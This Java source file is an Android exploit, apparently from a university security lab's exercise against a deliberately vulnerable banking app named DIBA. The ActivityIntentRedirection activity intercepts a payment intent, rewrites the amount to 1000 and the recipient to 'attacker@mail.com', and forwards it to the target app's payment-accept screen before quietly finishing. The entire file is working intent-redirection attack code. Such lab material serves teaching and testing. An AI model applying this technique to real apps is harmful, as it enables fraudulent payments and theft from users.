package ch.zhaw.securitylab.DIBA_exploit;

import android.content.Intent;
import android.os.Bundle;

import androidx.appcompat.app.AppCompatActivity;

public class ActivityIntentRedirection extends AppCompatActivity {
	// -------------------------------------------- //
	// CONSTRUCT & CREATE
	// -------------------------------------------- //
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_pay_intercepter);

		System.out.println("PayInterceptor started1");

		Intent intent = getIntent();

		intent.putExtra("auth_pay_amountSFr", "1000");
		intent.putExtra("auth_pay_target", "attacker@mail.com");
		
		String packageName = "ch.zhaw.securitylab.DIBA";
		String className   = "ch.zhaw.securitylab.DIBA.activity.pay.ActivityAuthPayAccept";
		intent.setClassName(packageName, className);
		
		startActivity(intent);
	}
	
	// -------------------------------------------- //
	// OVERRIDE
	// -------------------------------------------- //
	
	@Override
	protected void onResume()
	{
		super.onResume();
		// Relay back to attacked app
		finish();
	}
	
	@Override
	protected void onRestart()
	{
		super.onRestart();
		// Relay back to attacked app
		finish();
	}
	
}
